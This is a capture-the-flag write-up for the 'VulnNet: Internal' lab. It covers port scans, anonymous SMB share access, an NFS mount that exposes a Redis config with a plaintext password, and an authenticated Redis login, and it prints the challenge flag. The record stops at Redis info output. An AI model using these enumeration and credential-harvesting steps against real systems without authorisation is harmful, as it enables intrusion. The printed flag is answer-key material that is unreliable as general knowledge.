---
VulnNet Entertainment learns from its mistakes, and now they have something new for you...
---

# VulnNet Internal — Writeup

## Overview
### VulnNet Internal — Writeup
### VulnNet Internal — Writeup
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/133abb8b1a8449912a2461b8bd7d8edd.png)
### VulnNet: Internal
Start Machine
VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.
-   Difficulty: Easy/Medium
-   Operating System: Linux
This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags.
Note: It _might_ take 3-5 minutes for all the services to boot.
Icon made by [Freepik](https://www.freepik.com/) from [www.flaticon.com](http://www.flaticon.com/)
Answer the questions below

## Enumeration
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ python threader3000.py                           
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.104.221
------------------------------------------------------------
Scanning target 10.10.104.221
Time started: 2022-12-29 12:04:55.771460
------------------------------------------------------------
Port 22 is open
Port 139 is open
Port 111 is open
Port 445 is open
Port 873 is open
Port 2049 is open
Port 6379 is open
Port 38607 is open
Port 50567 is open
Port 59263 is open
Port 59667 is open
Port scan completed in 0:01:19.809872
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,139,111,445,873,2049,6379,38607,50567,59263,59667 -sV -sC -T4 -Pn -oA 10.10.104.221 10.10.104.221
************************************************************
Would you like to run Nmap or quit to terminal?
```
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.104.221 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.104.221:22
Open 10.10.104.221:111
Open 10.10.104.221:139
Open 10.10.104.221:445
Open 10.10.104.221:873
Open 10.10.104.221:2049
Open 10.10.104.221:6379
Open 10.10.104.221:38607
Open 10.10.104.221:50567
Open 10.10.104.221:59263
Open 10.10.104.221:59667
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 12:04 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating Ping Scan at 12:04
Scanning 10.10.104.221 [2 ports]
Completed Ping Scan at 12:04, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:04
Completed Parallel DNS resolution of 1 host. at 12:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:04
Scanning 10.10.104.221 [11 ports]
Discovered open port 22/tcp on 10.10.104.221
Discovered open port 111/tcp on 10.10.104.221
Discovered open port 139/tcp on 10.10.104.221
Discovered open port 445/tcp on 10.10.104.221
Discovered open port 6379/tcp on 10.10.104.221
Discovered open port 2049/tcp on 10.10.104.221
Discovered open port 50567/tcp on 10.10.104.221
Discovered open port 59667/tcp on 10.10.104.221
Discovered open port 873/tcp on 10.10.104.221
Discovered open port 59263/tcp on 10.10.104.221
Discovered open port 38607/tcp on 10.10.104.221
Completed Connect Scan at 12:04, 0.42s elapsed (11 total ports)
Initiating Service scan at 12:04
Scanning 11 services on 10.10.104.221
Completed Service scan at 12:04, 16.86s elapsed (11 services on 1 host)
NSE: Script scanning 10.10.104.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 6.66s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.90s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Nmap scan report for 10.10.104.221
Host is up, received conn-refused (0.21s latency).
Scanned at 2022-12-29 12:04:17 EST for 25s

PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e278f48ae2ff889bb8913e39afd6340 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV
|   256 f4fe0be25c88b563138550ddd586abbd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=
|   256 82ea4885f02a237e0ea9d9140a602fad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      55828/udp6  mountd
|   100005  1,2,3      57177/udp   mountd
|   100005  1,2,3      57731/tcp6  mountd
|   100005  1,2,3      59667/tcp   mountd
|   100021  1,3,4      32787/udp6  nlockmgr
|   100021  1,3,4      36803/tcp6  nlockmgr
|   100021  1,3,4      37676/udp   nlockmgr
|   100021  1,3,4      38607/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open  rsync       syn-ack (protocol version 31)
2049/tcp  open  nfs_acl     syn-ack 3 (RPC #100227)
6379/tcp  open  redis       syn-ack Redis key-value store
38607/tcp open  nlockmgr    syn-ack 1-4 (RPC #100021)
50567/tcp open  mountd      syn-ack 1-3 (RPC #100005)
59263/tcp open  mountd      syn-ack 1-3 (RPC #100005)
59667/tcp open  mountd      syn-ack 1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16889/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 59621/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50696/udp): CLEAN (Failed to receive data)
|   Check 4 (port 49763/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2022-12-29T18:04:35+01:00
|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
| smb2-time: 
|   date: 2022-12-29T17:04:35
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -L 10.10.104.221
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

or without a pass
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -N -L 10.10.104.221

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

getting files
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -N \\\\10.10.104.221\\shares
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3278172 blocks available
smb: \> cd temp
smb: \temp\> dir
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021

                11309648 blocks of size 1024. 3278172 blocks available
smb: \temp\> get services.txt 
getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \temp\> cd ..
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3277928 blocks available
smb: \data\> get data.txt 
getting file \data\data.txt of size 48 as data.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> get business-req.txt 
getting file \data\business-req.txt of size 190 as business-req.txt (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3276872 blocks available
smb: \> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3276872 blocks available
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -N \\\\10.10.104.221\\print$
tree connect failed: NT_STATUS_ACCESS_DENIED
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -N \\\\10.10.104.221\\IPC$  
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ ls
business-req.txt  data.txt  LICENSE  README.md  services.txt  threader3000.py
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ cat data.txt      
Purge regularly data that is not needed anymore
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ cat services.txt 
THM{0a09d51e488f5fa105d8d866a497440a}
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ cat business-req.txt 
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
                                                      

Network File System, o NFS, es un protocolo de nivel de aplicación, según el Modelo OSI. Es utilizado para sistemas de archivos distribuido en un entorno de red de computadoras de área local. Posibilita que distintos sistemas conectados a una misma red accedan a ficheros remotos como si se tratara de locales.

let's mount
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ mkdir tmp
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ ls
business-req.txt  data.txt  LICENSE  README.md  services.txt  threader3000.py  tmp
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ sudo mount -t nfs 10.10.104.221: tmp
[sudo] password for kali:
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ tree tmp                
tmp
└── opt
    └── conf
        ├── hp
        │   └── hplip.conf
        ├── init
        │   ├── anacron.conf
        │   ├── lightdm.conf
        │   └── whoopsie.conf
        ├── opt
        ├── profile.d
        │   ├── bash_completion.sh
        │   ├── cedilla-portuguese.sh
        │   ├── input-method-config.sh
        │   └── vte-2.91.sh
        ├── redis
        │   └── redis.conf
        ├── vim
        │   ├── vimrc
        │   └── vimrc.tiny
        └── wildmidi
            └── wildmidi.cfg

9 directories, 12 files
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ redis-cli -h 10.10.104.221
10.10.104.221:6379> info
NOAUTH Authentication required.

need a pass
```
```text
┌──(kali㉿kali)-[~/threader3000]
└─$ cd tmp/opt/conf/redis
```
```text
┌──(kali㉿kali)-[~/…/tmp/opt/conf/redis]
└─$ ls
redis.conf
```
```text
┌──(kali㉿kali)-[~/…/tmp/opt/conf/redis]
└─$ more redis.conf | grep requirepass
```
```text
# If the master is password protected (using the "requirepass" configuration
requirepass "B65Hx562F@ggAZ@F"
```
```text
# requirepass foobared

redis pass B65Hx562F@ggAZ@F
```
```text
┌──(kali㉿kali)-[~/…/tmp/opt/conf/redis]
└─$ redis-cli --help          
redis-cli 7.0.5

Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
  -h <hostname>      Server hostname (default: 127.0.0.1).
  -p <port>          Server port (default: 6379).
  -s <socket>        Server socket (overrides hostname and port).
  -a <password>      Password to use when connecting to the server.
                     You can also use the REDISCLI_AUTH environment
                     variable to pass this password more safely
                     (if both are used, this argument takes precedence).
  --user <username>  Used to send ACL style 'AUTH username pass'. Needs -a.
  --pass <password>  Alias of -a for consistency with the new --user option.
```
```text
┌──(kali㉿kali)-[~/…/tmp/opt/conf/redis]
└─$ redis-cli -h 10.10.104.221 -a B65Hx562F@ggAZ@F
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.104.221:6379> info
```
```text
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-135-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:546
run_id:0c4ec4ed01ac5b9407f52bfee9f9ee2d87790d02
tcp_port:6379
uptime_in_seconds:2214
uptime_in_days:0
hz:10
lru_clock:11391204
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```
```text
# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0
```
```text
# Memory
used_memory:841488
used_memory_human:821.77K
used_memory_rss:2887680
used_memory_rss_human:2.75M
used_memory_peak:841488
used_memory_peak_human:821.77K
used_memory_peak_perc:100.00%
used_memory_overhead:832358
used_memory_startup:782432
used_memory_dataset:9130
used_memory_dataset_perc:15.46%
total_system_memory:2087923712
total_system_memory_human:1.94G
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:3.43
mem_allocator:jemalloc-3.6.0
active_defrag_running:0
lazyfree_pending_objects:0
```
```text
# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1672333374
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
```
```text
# Stats
total_connections_received:10
total_commands_processed:3
instantaneous_ops_per_sec:0
total_net_input_bytes:355
total_net_output_bytes:10590
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
```
```text
# Replication
role:master
connected_slaves:0
master_replid:563c34f53fa965db4c43dc7c3b1f3817eda17381
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0
```
```text
# CPU
used_cpu_sys:2.50
used_cpu_user:1.55
used_cpu_sys_children:0.00
used_cpu_user_children:0.00
```
```text
# Cluster
